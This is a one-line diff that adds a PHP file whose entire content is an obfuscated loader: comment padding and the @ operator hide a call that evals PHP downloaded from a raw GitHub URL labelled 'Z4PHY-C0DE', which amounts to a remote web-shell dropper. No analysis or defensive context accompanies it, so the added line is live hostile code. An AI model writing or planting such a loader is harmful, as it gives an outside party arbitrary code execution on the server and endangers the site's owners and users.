@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/z4phy-mini/call-me-z4p.php"))/******/ /*Z4PHY-C0DE*/?>
